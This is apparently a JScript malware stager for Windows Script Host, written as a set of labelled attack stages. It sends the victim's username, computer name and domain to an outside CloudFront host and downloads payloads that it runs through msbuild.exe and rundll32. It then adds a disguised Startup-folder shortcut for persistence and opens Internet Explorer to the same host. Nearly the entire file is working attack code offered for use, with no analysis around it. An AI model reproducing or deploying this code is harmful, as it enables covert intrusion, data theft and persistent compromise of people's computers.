// When finished editing run the below to minify the file and strip all comments etc.
// 	apt install yui-compressor
// 	yui-compressor -o file.min.js file.js

function i() {
	var a = "";
	var p = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 0; i < 5; i++)
	a += p.charAt(Math.floor(Math.random() * p.length));
	return a;
}

var burl = "https://d3t2rabdq8koga.cloudfront.net";

// .NET VB downloader to send env details back
try {
	var OrangeView=new ActiveXObject(("WScript.Shell"));
	var u=OrangeView.ExpandEnvironmentStrings("%USERNAME%")
	var c=OrangeView.ExpandEnvironmentStrings("%COMPUTERNAME%")	
	var d=OrangeView.ExpandEnvironmentStrings("%USERDOMAIN%")	
	try {
		OrangeView.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="4.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v4.0.0.30319" /></assembly>';			
	} catch(e) { 
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="8.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v2.0.50727" /></assembly>';		
	}
	var ax = new ActiveXObject('Microsoft.Windows.ActCtx');ax.ManifestText = manifest;
	var obj = ax.CreateObject(('Microsoft.VisualBasic.Devices.Network'));
	var Pomplum = new ActiveXObject(("WScript.Shell"));
	var ii = i();
	obj.DownloadFile((burl+"/resources/2019/01/23/resources.xml?u="+u+"&c="+c+"&d="+d), (ii+"14j5.tmp"));
} catch(e) {}

// .NET VB downloader and msbuild xml file
try {
	var OrangeView=new ActiveXObject(("WScript.Shell"));
	try {
		OrangeView.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="4.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v4.0.0.30319" /></assembly>';			
	} catch(e) { 
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="8.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v2.0.50727" /></assembly>';		
	}
	var ax = new ActiveXObject('Microsoft.Windows.ActCtx');ax.ManifestText = manifest;
	var obj = ax.CreateObject(('Microsoft.VisualBasic.Devices.Network'));
	var Pomplum = new ActiveXObject(("WScript.Shell"));
	sf = new ActiveXObject(("Scripting.FileSystemObject"));
    tm = sf.GetSpecialFolder(2);
	var ii = i();
	obj.DownloadFile((burl+"/resources/2019/01/23/resources.xml?vbm"), (tm+"\\"+ii+".xml"));
	Pomplum.Run(("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe "+tm+"\\"+ii+".xml"), 0, true);
} catch(e) {} 

// .NET VB downloader for dll and rundll32
try {
	var OrangeView=new ActiveXObject(("WScript.Shell"));
	try {
		OrangeView.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="4.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v4.0.0.30319" /></assembly>';			
	} catch(e) { 
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="8.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v2.0.50727" /></assembly>';		
	}
	var ax = new ActiveXObject('Microsoft.Windows.ActCtx');ax.ManifestText = manifest;
	var obj = ax.CreateObject(('Microsoft.VisualBasic.Devices.Network'));
	var Pomplum = new ActiveXObject(("WScript.Shell"));
	sf = new ActiveXObject(("Scripting.FileSystemObject"));
    tm = sf.GetSpecialFolder(2);
	var ii = i();
	obj.DownloadFile((burl+"/resources/2019/01/23/resources.xml?vbr"), (tm+"\\"+ii+".xml"));
	Pomplum.Run(("C:\\Windows\\System32.NET\\rundll32.exe "+tm+"\\"+ii+".xml,RegisterSound"), 0, true);
} catch(e) {} 

// .NET WebClient downloader for dll and rundll32
try {
	var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="b77a5c561934e089" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF351}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.0.30319" /></assembly>';
	var ax = new ActiveXObject('Microsoft.Windows.ActCtx');ax.ManifestText = manifest;
	var obj = ax.CreateObject('System.Net.WebClient');
	var Pomplum = new ActiveXObject(("WScript.Shell"));
	sf = new ActiveXObject(("Scripting.FileSystemObject"));
    tm = sf.GetSpecialFolder(2);
	var ii = i();
	obj.DownloadFile((burl+"/resources/2019/01/23/resources.xml?wcr"), (tm+"\\"+ii+".xml"));
	Pomplum.Run(("C:\\Windows\\System32.NET\\rundll32.exe "+tm+"\\"+ii+".xml,RegisterSound"), 0, true);
} catch(e) {} 

// .NET VB downloader and add startup key
try {
	var OrangeView=new ActiveXObject(("WScript.Shell"));
	try {
		OrangeView.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="4.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v4.0.0.30319" /></assembly>';			
	} catch(e) { 
		var manifest='<?xml version="1.0" encoding="UTF-16" standalone="yes" ?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="Microsoft.VisualBasic" version="8.0.0.0" publicKeyToken="B03F5F7F11D50A3A" /><clrClass clsid="{8ACBA7D6-93C2-3E22-B66E-5F89751FF358}" progid="Microsoft.VisualBasic.Devices.Network" threadingModel="Both" name="Microsoft.VisualBasic.Devices.Network" runtimeVersion="v2.0.50727" /></assembly>';		
	}			
	var ax = new ActiveXObject('Microsoft.Windows.ActCtx');ax.ManifestText = manifest;
	var obj = ax.CreateObject(('Microsoft.VisualBasic.Devices.Network'));
	var Pomplum = new ActiveXObject(("WScript.Shell"));
	sf = new ActiveXObject(("Scripting.FileSystemObject"));
	tm = sf.GetSpecialFolder(2);
	strStartUp=Pomplum.SpecialFolders("Startup");
	var ii = i();
	obj.DownloadFile((burl+"/resources/2019/01/23/resources.xml?vbsh"), (tm+"\\"+ii+".xml"));
	var oShellLink=Pomplum.CreateShortcut(strStartUp+"\\info"+ii+".lnk");
	oShellLink.TargetPath="C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe";
	oShellLink.Arguments=tm+"\\"+ii+".xml";
	oShellLink.WindowStyle=7;
	oShellLink.Hotkey="CTRL+SHIFT+F";
	oShellLink.IconLocation="msinfo32.exe, 0";
	oShellLink.WorkingDirectory=strStartUp;
	oShellLink.Save();			
} catch(e) {}

// launch IE to a specific URL after execution
try {
	var juicepwb=new ActiveXObject(("InternetExplorer.Application"));
	juicepwb.visible=true;juicepwb.Navigate(burl+"/bb681324-bf32-4b0b-9bda-778288b4a33b");			
} catch(e) {}